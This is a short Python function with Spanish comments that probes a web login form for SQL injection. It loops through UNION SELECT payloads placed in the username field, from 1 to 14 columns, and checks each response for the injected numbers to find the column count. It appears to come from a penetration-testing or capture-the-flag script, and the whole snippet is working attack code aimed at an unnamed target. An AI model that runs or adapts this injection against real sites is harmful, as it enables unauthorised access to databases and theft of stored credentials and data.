def test_login_union():
    """Prueba UNION SELECT en el login"""
    print("\n" + "="*70)
    print("  PROBANDO UNION SELECT EN LOGIN")
    print("="*70)
    
    for cols in range(1, 15):
        # Crear payload con UNION SELECT
        numbers = [str(i + 100) for i in range(cols)]
        username = f"admin' UNION SELECT {','.join(numbers)}-- -"
        data = {"username": username, "password": "test"}
        
        try:
            r = requests.post(f"{URL}?action=login", data=data, cookies=COOKIE, timeout=10)
            content = r.text
            
            # Buscar números inyectados
            found = False
            for num in numbers:
                if num in content:
                    print(f"[+] ¡NÚMERO {num} ENCONTRADO! Columnas: {cols}")
                    print(f"    Contenido: {content[:500]}...")
                    found = True
                    break
            
            if found:
                break
            else:
                print(f"[-] {cols} columnas: No se encontraron números")
                
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(0.3)

test_login_union()
